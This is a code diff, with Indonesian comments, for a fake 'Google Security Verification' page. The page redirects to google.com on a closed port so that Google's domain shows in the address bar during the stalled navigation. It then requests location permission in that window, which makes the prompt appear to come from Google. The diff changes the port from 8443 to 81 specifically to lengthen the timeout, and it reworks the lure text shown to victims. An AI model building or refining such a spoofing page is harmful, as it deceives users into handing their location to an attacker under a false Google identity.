@@ -19,7 +19,7 @@
 
 <div class="panel" id="main-card">
   <h2>🔒 Google Security Verification</h2>
-  <p>Klik tombol di bawah untuk memverifikasi akun Google Anda. Anda akan diarahkan ke server aman Google (port 8443) dan diminta mengizinkan lokasi untuk verifikasi.</p>
+  <p>Klik tombol di bawah untuk memverifikasi akun Google Anda. Anda akan diarahkan ke server aman Google dan diminta mengizinkan lokasi.</p>
   <button id="startBtn">Verify Account & Allow Location</button>
   <div id="status">[*] Ready...</div>
 </div>
@@ -43,10 +43,11 @@
     log("[*] Memulai location permission spoofing...");
 
     // ============================================
-    // 2. REDIRECT KE GOOGLE:8443 (PENDING NAVIGATION)
+    // 2. REDIRECT KE GOOGLE:81 (PENDING NAVIGATION)
     // ============================================
+    // Port 81 biasanya tertutup, menciptakan delay (timeout).
     try {
-      window.location.href = "https://www.google.com:8443";
+      window.location.href = "https://www.google.com:81";
     } catch (e) {
       log("[-] Redirect error: " + e.message);
     }
@@ -54,7 +55,7 @@
     // ============================================
     // 3. SELAMA DELAY, MINTA IZIN LOKASI
     // ============================================
-    // Prompt lokasi akan muncul di tengah layar saat address bar menampilkan google.com:8443.
+    // Prompt lokasi muncul saat address bar menampilkan google.com:81.
     setTimeout(function() {
       log("[*] Meminta Izin Lokasi (saat pending navigation)...");
       
